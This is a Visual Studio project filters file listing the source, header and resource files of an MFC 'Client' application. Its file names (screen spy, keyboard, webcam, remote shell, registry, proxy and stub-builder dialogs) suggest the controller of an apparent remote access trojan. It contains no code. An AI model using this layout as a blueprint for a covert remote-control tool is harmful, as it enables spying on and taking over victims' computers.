<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{59e2f2e8-5903-4646-be53-58818c6bd14c}</UniqueIdentifier>
      <Extensions>cpp;c;cxx;rc;def;r;odl;idl;hpj;bat</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{a7c39c45-23c2-49e6-9e99-a5a447335d91}</UniqueIdentifier>
      <Extensions>h;hpp;hxx;hm;inl</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{93ae25b3-df5c-472f-9440-0d9c1bf70ced}</UniqueIdentifier>
      <Extensions>ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="..\common\Audio.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="AudioDlg.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="Include\BmpToAvi.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="Include\Buffer.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="BuildDlg.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="ChangeGroupDlg.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="Client.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="ClientDoc.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="ClientView.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="FileManagerDlg.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="FileTransferModeDlg.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="Include\IniFile.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="Include\InputDlg.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="Include\IOCPServer.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="KeyBoardDlg.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="LocalUpload.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="MainFrm.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="MsgBoxDlg.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="OpenProxy.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="PcView.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="PrankDlg.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="ProxyMapDlg.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="RegeditDlg.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="RegeditTextDlg.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="ScreenSpyDlg.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="ServiceDlg.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="ServiceInfoDlg.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="SetColor.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="SettingDlg.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="Include\SEU_QQwry.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="ShellDlg.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="Include\ShowWave.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="Include\SoundToWav.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="StdAfx.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="SystemDlg.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="TextChatDlg.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="WebCamDlg.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="Include\XvidDec.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <ResourceCompile Include="Client.rc">
      <Filter>Source Files</Filter>
    </ResourceCompile>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="AudioDlg.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="Include\BmpToAvi.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="Include\Buffer.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="BuildDlg.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="ChangeGroupDlg.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="Client.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="ClientDoc.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="ClientView.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="FileManagerDlg.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="FileTransferModeDlg.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="Include\IniFile.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="Include\InputDlg.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="Include\IOCPServer.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="KeyBoardDlg.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="LocalUpload.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="..\common\macros.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="MainFrm.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="Include\Mapper.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="..\common\minilzo.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="MsgBoxDlg.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="OpenProxy.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="PcView.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="PrankDlg.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="ProxyMapDlg.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="RegeditDlg.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="RegeditTextDlg.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="Resource.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="ScreenSpyDlg.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="ServiceDlg.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="ServiceInfoDlg.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="SetColor.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="SettingDlg.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="Include\SEU_QQwry.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="ShellDlg.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="Include\showwave.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="Include\SoundToWav.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="StdAfx.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="SystemDlg.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="TextChatDlg.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="WebCamDlg.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="Include\XvidDec.h">
      <Filter>Header Files</Filter>
    </ClInclude>
  </ItemGroup>
  <ItemGroup>
    <Image Include="res\Reg\201.ico">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\Reg\202.ico">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\Reg\203.ico">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\Reg\204.ico">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\Reg\205.ico">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\Reg\206.ico">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\AppWindows.ico">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\Audio.ico">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\Bitmap_1.bmp">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\Bitmap_2.bmp">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\Bitmap_3.bmp">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\cam.ico">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\Client.ico">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\ClientDoc.ico">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\Cmdshell.ico">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\File.ico">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\keyboard.ico">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\MenuBar.bmp">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\nocam.ico">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\Process.ico">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\regedit.ico">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\ScreenSpy.ico">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\SearchToolBar.bmp">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\Service.ico">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\System.ico">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\TextChat.ico">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\toolbar.bmp">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\toolbar1.bmp">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\toolbar2.bmp">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\toolbar3.bmp">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\toolbar4.bmp">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\WebCam.ico">
      <Filter>Resource Files</Filter>
    </Image>
  </ItemGroup>
  <ItemGroup>
    <Media Include="res\Wave\login.wav" />
    <Media Include="res\Wave\offline.wav" />
    <Media Include="res\Wave\Setting.wav" />
  </ItemGroup>
  <ItemGroup>
    <Text Include="ReadMe.txt" />
  </ItemGroup>
  <ItemGroup>
    <Manifest Include="res\xpstyle.manifest" />
  </ItemGroup>
  <ItemGroup>
    <CustomBuild Include="res\1.cur">
      <Filter>Resource Files</Filter>
    </CustomBuild>
    <CustomBuild Include="res\2.cur">
      <Filter>Resource Files</Filter>
    </CustomBuild>
    <CustomBuild Include="res\Client.rc2">
      <Filter>Resource Files</Filter>
    </CustomBuild>
    <CustomBuild Include="res\dot.cur">
      <Filter>Resource Files</Filter>
    </CustomBuild>
  </ItemGroup>
</Project>